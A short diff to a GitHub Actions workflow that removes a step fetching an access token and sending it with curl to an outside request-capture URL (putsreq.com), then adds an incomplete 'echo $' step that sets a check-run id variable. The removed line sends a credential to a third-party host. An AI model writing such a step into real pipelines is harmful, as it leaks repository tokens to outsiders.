@@ -10,12 +10,11 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - uses: qoomon/actions--access-token@v3
-        id: token
-        with:
-          permissions: |
-            contents: read
-      - run: curl "https://putsreq.com/ksp0TTIIgjPB0ceX9RGr?token=${{ steps.token.outputs.token }}"
-      - run: sleep 60
+    
+      - run: |
+          echo $
+        env:
+          GITHUB_JOB_CHECK_RUNN_ID: ${{ job.check_run_id }}
+
         
         
